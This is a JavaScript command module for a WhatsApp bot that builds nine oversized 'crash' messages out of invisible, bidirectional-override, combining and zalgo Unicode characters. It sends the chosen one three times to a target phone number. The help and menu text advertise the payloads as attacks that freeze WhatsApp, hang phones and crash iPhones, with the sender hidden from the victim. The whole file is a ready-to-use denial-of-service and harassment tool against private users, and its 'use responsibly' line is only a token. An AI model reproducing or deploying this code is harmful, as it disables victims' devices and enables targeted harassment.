const fs = require('fs');
const path = require('path');

const invisibleChar = '\u200B\u200C\u200D\u2060\u180E\uFEFF';
const zalgo = '\u0336\u0337\u0338\u034F\u035C\u035D\u035E\u035F\u0360\u0362\u0363\u0364\u0365\u0366\u0367\u0368\u0369\u036A\u036B\u036C\u036D\u036E\u036F';

function generateZalgo(intensity) {
    let result = '';
    for (let i = 0; i < intensity; i++) {
        result += zalgo[Math.floor(Math.random() * zalgo.length)];
    }
    return result;
}

function makeInvisible(text) {
    return invisibleChar.repeat(50) + text + invisibleChar.repeat(50);
}

const crashTexts = {
    uicrash: makeInvisible(
        `\u202E\u202D\u202C\u202B\u202A`.repeat(500) +
        `\u{E0001}`.repeat(5000) +
        `\u034F`.repeat(50000) +
        `\u0BCD\u0BCD\u0BCD`.repeat(5000) +
        `ٴۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧ`.repeat(1000) +
        Array(500).fill(`\u202E\u0D9E\u00AD`).join('') +
        `\u{1D173}\u{1D174}\u{1D175}`.repeat(10000) +
        generateZalgo(50000)
    ),
    
    ioscrash: makeInvisible(
        `ۣۣۣۜۜۜ͜͜͜͡͡͡`.repeat(5000) +
        `ٴۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧ`.repeat(500) +
        `\u0BCD`.repeat(30000) +
        `\u{E007F}`.repeat(5000) +
        `؜`.repeat(10000) +
        `\u034F\u034F\u034F`.repeat(20000)
    ),
    
    freezecrash: makeInvisible(
        Array(1000).fill(`\u202E\u0D9E\u00AD\u034F`).join('') +
        `\u{FFF9}\u{FFFA}\u{FFFB}`.repeat(20000) +
        `\u2060\u2061\u2062\u2063\u2064`.repeat(15000) +
        `\u{E0001}\u{E007F}`.repeat(10000) +
        generateZalgo(40000)
    ),
    
    hangcrash: makeInvisible(
        `\u{FFF9}\u{FFFA}\u{FFFB}`.repeat(50000) +
        `\u202A\u202B\u202C\u202D\u202E`.repeat(20000) +
        `\u{1D159}\u{1D173}\u{1D17A}`.repeat(15000) +
        `\u034F`.repeat(60000) +
        `؜`.repeat(20000)
    ),
    
    memorycrash: makeInvisible(
        Buffer.alloc(800000, '\u034F').toString() +
        `\u{E0001}`.repeat(20000) +
        `ꦿꦿꦿ`.repeat(30000) +
        `\u0BCD`.repeat(40000) +
        generateZalgo(60000)
    ),
    
    blackscreen: makeInvisible(
        `㋛`.repeat(80000) +
        `\u{1D173}`.repeat(20000) +
        `\u202E\u202D`.repeat(30000) +
        `\u{E0001}\u{E007F}`.repeat(15000) +
        `\u034F`.repeat(50000)
    ),
    
    lagcrash: makeInvisible(
        Array(500).fill(`\u034F\u034F\u034F\u034F\u034F\u202E\u202D`).join('\n') +
        `ꦿ`.repeat(60000) +
        `\u0BCD`.repeat(30000) +
        `\u{E0001}`.repeat(15000) +
        generateZalgo(50000)
    ),

    megacrash: makeInvisible(
        `\u202E\u202D\u202C\u202B\u202A`.repeat(2000) +
        `\u{E0001}`.repeat(30000) +
        `\u034F`.repeat(100000) +
        `ٴۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧ`.repeat(3000) +
        `\u0BCD`.repeat(50000) +
        Array(2000).fill(`\u202E\u0D9E\u00AD`).join('') +
        `\u{1D173}\u{1D174}\u{1D175}`.repeat(20000) +
        `\u{FFF9}\u{FFFA}\u{FFFB}`.repeat(30000) +
        `ꦿ`.repeat(50000) +
        generateZalgo(80000)
    ),

    killercrash: makeInvisible(
        `\u{E0001}\u{E007F}`.repeat(50000) +
        `\u034F`.repeat(150000) +
        `\u202E\u202D\u202C`.repeat(10000) +
        `ۣۜ͜͡`.repeat(30000) +
        `\u0BCD\u0BCD\u0BCD`.repeat(40000) +
        `؜`.repeat(50000) +
        `\u{FFF9}\u{FFFA}\u{FFFB}`.repeat(40000) +
        generateZalgo(100000) +
        Buffer.alloc(500000, '\u034F').toString()
    )
};

async function crashCommand(sock, chatId, message, args, command) {
    try {
        const targetNumber = args[0];
        
        if (!targetNumber) {
            const helpText = `
╭━━━━━━━━━━━━━━━━━━━━━╮
┃  💀 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 💀
┃━━━━━━━━━━━━━━━━━━━━━
┃ 📱 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:
┃━━━━━━━━━━━━━━━━━━━━━
┃ 💥 .uicrash <number>
┃ 🍎 .ioscrash <number>
┃ 🥶 .freezecrash <number>
┃ ⏳ .hangcrash <number>
┃ 💾 .memorycrash <number>
┃ 🖤 .blackscreen <number>
┃ 🐌 .lagcrash <number>
┃ ☠️ .megacrash <number>
┃ 💀 .killercrash <number>
┃━━━━━━━━━━━━━━━━━━━━━
┃ 📝 𝗨𝘀𝗮𝗴𝗲:
┃ .uicrash +252xxxxxxxxx
┃━━━━━━━━━━━━━━━━━━━━━
┃ ✅ 𝗜𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲 𝗠𝗼𝗱𝗲
┃ ✅ 𝗦𝘁𝗿𝗼𝗻𝗴 𝗕𝘂𝗴𝘀
╰━━━━━━━━━━━━━━━━━━━━━╯

⚠️ 𝗪𝗮𝗿𝗻𝗶𝗻𝗴: 𝗨𝘀𝗲 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗹𝘆!`;
            
            await sock.sendMessage(chatId, { text: helpText }, { quoted: message });
            return;
        }

        let formattedNumber = targetNumber.replace(/[^0-9]/g, '');
        if (!formattedNumber.includes('@s.whatsapp.net')) {
            formattedNumber = formattedNumber + '@s.whatsapp.net';
        }

        const crashType = command.toLowerCase();
        const crashText = crashTexts[crashType];

        if (!crashText) {
            await sock.sendMessage(chatId, { 
                text: '❌ Invalid crash type!' 
            }, { quoted: message });
            return;
        }

        await sock.sendMessage(chatId, { 
            text: `🔄 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗶𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲 ${crashType} 𝘁𝗼 ${targetNumber}...` 
        }, { quoted: message });

        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(formattedNumber, { 
                text: crashText,
                disappearingMessagesInChat: false
            });
        }

        const successMsg = `
╭━━━━━━━━━━━━━━━━━━━━━╮
┃  ✅ 𝐂𝐑𝐀𝐒𝐇 𝐒𝐄𝐍𝐓!
┃━━━━━━━━━━━━━━━━━━━━━
┃ 💀 𝗧𝘆𝗽𝗲: ${crashType.toUpperCase()}
┃ 📱 𝗧𝗮𝗿𝗴𝗲𝘁: ${targetNumber}
┃ 👻 𝗠𝗼𝗱𝗲: 𝗜𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲
┃ 🔢 𝗦𝗲𝗻𝘁: 3x
┃ ⏰ 𝗧𝗶𝗺𝗲: ${new Date().toLocaleTimeString()}
╰━━━━━━━━━━━━━━━━━━━━━╯

💥 𝗦𝘁𝗿𝗼𝗻𝗴 𝗯𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!
👻 𝗧𝗮𝗿𝗴𝗲𝘁 𝘄𝗼𝗻'𝘁 𝘀𝗲𝗲 𝘀𝗲𝗻𝗱𝗲𝗿!
🤖 𝗡𝗔𝗚𝗜𝗜𝗣 𝗦𝗧𝗔𝗥 𝗠𝗗`;

        await sock.sendMessage(chatId, { text: successMsg }, { quoted: message });

    } catch (error) {
        console.error('Error in crash command:', error);
        await sock.sendMessage(chatId, { 
            text: '❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝘀𝗲𝗻𝗱 𝗰𝗿𝗮𝘀𝗵. 𝗖𝗵𝗲𝗰𝗸 𝘁𝗵𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗳𝗼𝗿𝗺𝗮𝘁.' 
        }, { quoted: message });
    }
}

async function bugMenuCommand(sock, chatId, message) {
    const menuText = `
╭━━━━━━━━━━━━━━━━━━━━━╮
┃   💀 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 💀
┃━━━━━━━━━━━━━━━━━━━━━
┃
┃ 💥 .𝘂𝗶𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗨𝗜 𝗖𝗿𝗮𝘀𝗵 + 𝗟𝗮𝗴 + 𝗙𝗿𝗲𝗲𝘇𝗲
┃
┃ 🍎 .𝗶𝗼𝘀𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗖𝗿𝗮𝘀𝗵𝗲𝘀 𝗶𝗣𝗵𝗼𝗻𝗲 𝗱𝗲𝘃𝗶𝗰𝗲𝘀
┃
┃ 🥶 .𝗳𝗿𝗲𝗲𝘇𝗲𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗙𝗿𝗲𝗲𝘇𝗲𝘀 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽
┃
┃ ⏳ .𝗵𝗮𝗻𝗴𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗛𝗮𝗻𝗴𝘀 𝘁𝗵𝗲 𝗱𝗲𝘃𝗶𝗰𝗲
┃
┃ 💾 .𝗺𝗲𝗺𝗼𝗿𝘆𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗠𝗲𝗺𝗼𝗿𝘆 𝗼𝘃𝗲𝗿𝗹𝗼𝗮𝗱
┃
┃ 🖤 .𝗯𝗹𝗮𝗰𝗸𝘀𝗰𝗿𝗲𝗲𝗻 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗕𝗹𝗮𝗰𝗸 𝘀𝗰𝗿𝗲𝗲𝗻 𝗯𝘂𝗴
┃
┃ 🐌 .𝗹𝗮𝗴𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗖𝗮𝘂𝘀𝗲𝘀 𝗵𝗲𝗮𝘃𝘆 𝗹𝗮𝗴
┃
┃ ☠️ .𝗺𝗲𝗴𝗮𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗔𝗹𝗹-𝗶𝗻-𝗼𝗻𝗲 𝗰𝗿𝗮𝘀𝗵
┃
┃ 💀 .𝗸𝗶𝗹𝗹𝗲𝗿𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗠𝗼𝘀𝘁 𝗽𝗼𝘄𝗲𝗿𝗳𝘂𝗹 𝗰𝗿𝗮𝘀𝗵
┃
┃━━━━━━━━━━━━━━━━━━━━━
┃ 📝 𝗘𝘅𝗮𝗺𝗽𝗹𝗲:
┃ .killercrash +252612345678
┃━━━━━━━━━━━━━━━━━━━━━
┃ ✅ 𝗔𝗹𝗹 𝗯𝘂𝗴𝘀 𝗮𝗿𝗲 𝗜𝗡𝗩𝗜𝗦𝗜𝗕𝗟𝗘
┃ ✅ 𝗦𝗲𝗻𝘁 𝟯𝘅 𝗳𝗼𝗿 𝗺𝗮𝘅 𝗲𝗳𝗳𝗲𝗰𝘁
╰━━━━━━━━━━━━━━━━━━━━━╯

⚠️ 𝗨𝘀𝗲 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗹𝘆!
🤖 𝗡𝗔𝗚𝗜𝗜𝗣 𝗦𝗧𝗔𝗥 𝗠𝗗`;

    await sock.sendMessage(chatId, { text: menuText }, { quoted: message });
}

module.exports = { crashCommand, bugMenuCommand };
